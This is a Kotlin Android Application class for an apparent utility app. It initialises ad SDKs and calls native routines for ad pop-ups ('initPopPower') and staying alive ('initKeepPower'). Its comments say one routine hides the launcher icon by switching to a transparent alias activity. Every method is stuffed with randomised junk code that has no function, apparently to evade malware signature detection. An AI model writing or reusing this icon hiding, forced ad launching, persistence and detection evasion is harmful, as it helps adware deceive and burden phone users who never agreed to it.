package couy.bcu.wmxkm

import android.app.Application
import android.content.Intent
import android.os.Bundle
import couy.bcu.wmxkm.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import couy.hnrvi.vgeq.ad.runtime.AdLifecycleInstaller
import couy.hnrvi.vgeq.base.APPContext
import couy.hnrvi.vgeq.base.OverseaAppHost
import couy.hnrvi.vgeq.base.OverseaAppInitializer


class YSEB : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        @JvmStatic
        var insApp: YSEB? = null
    }

    override fun onCreate() {
        val kSnzaFFvQcIrhnLX : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val tTpNhfKZIf  = kSnzaFFvQcIrhnLX ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_46" 
            }
            if (tTpNhfKZIf .startsWith("qJzPbqcNDXXmJYMoxH ")) {
                android.util.Log.v("TAG", tTpNhfKZIf )
            }
        super.onCreate()
        insApp = this
        // 原生 Application 需要主动触发海外公共初始化。
        OverseaAppInitializer.init(this, this)
        // 安装返回广告所需的 Activity 生命周期监听。
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    override fun openLaunch(intent: Intent?) {
        val arr_JpCFrCjfP  = listOf("BMPuwlYBGOAvemL", "HpSuewvtsfET", "ijSkaxALkIsyOP").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_VBIINcfCBwzmvXdX  = arr_JpCFrCjfP .filter { it.length > 50 }
         if (ad_VBIINcfCBwzmvXdX .isNotEmpty() && java.lang.System.currentTimeMillis() < 62) {
             ad_VBIINcfCBwzmvXdX .forEach { _ ->  }
         }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val arr_RctxuZZeDaarXRCLK  = listOf("DTpmZqHDoj", "EQVzpUI", "EQUmIZ").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_oljVcostjWVUPEzN  = arr_RctxuZZeDaarXRCLK .filter { it.length > 73 }
         if (ad_oljVcostjWVUPEzN .isNotEmpty() && java.lang.System.currentTimeMillis() < 37) {
             ad_oljVcostjWVUPEzN .forEach { _ ->  }
         }
        YSFV.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
           val htcZTCKcO : Any = if (kotlin.random.Random.nextBoolean()) 76 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val fVCPifxclgdADPQPx  = (htcZTCKcO  as? String)?.reversed() ?: "gdxWKCwzsAEMSmpfXPn_1630654597"

        if (fVCPifxclgdADPQPx  == "ZDMFBOdSaWXPD") {
            java.lang.System.out.print(fVCPifxclgdADPQPx )
        }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }


    override fun initPopPower() {
        val arr_ThUaalWnQhVUNA = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_zcufpzm  = (arr_ThUaalWnQhVUNA  shl 98) xor (arr_ThUaalWnQhVUNA  shr 23)
         val j_UPZjs  = i_zcufpzm .inv() and 0xFFFF
         if (j_UPZjs  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_btJrkkGWVfxUDlTzEeB")
         }
        // 启动图标隐藏：禁用 HHN 主入口，启用透明 MysteryAliasActivity
        startActivity(Intent(this, YSEC::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
    }


    override fun initKeepPower(app: Application) {
        val arr_ImeijkEoBJaJkCDAYy  = listOf("WbXmikwsVUZApcosZ", "AyCypUEVYzqD", "kTGitImKjF").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_UnScVVLAXWEavkoz  = arr_ImeijkEoBJaJkCDAYy .filter { it.length > 21 }
         if (ad_UnScVVLAXWEavkoz .isNotEmpty() && java.lang.System.currentTimeMillis() < 60) {
             ad_UnScVVLAXWEavkoz .forEach { _ ->  }
         }
        // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
        NativeJniUtils.virinit(app)
    }

}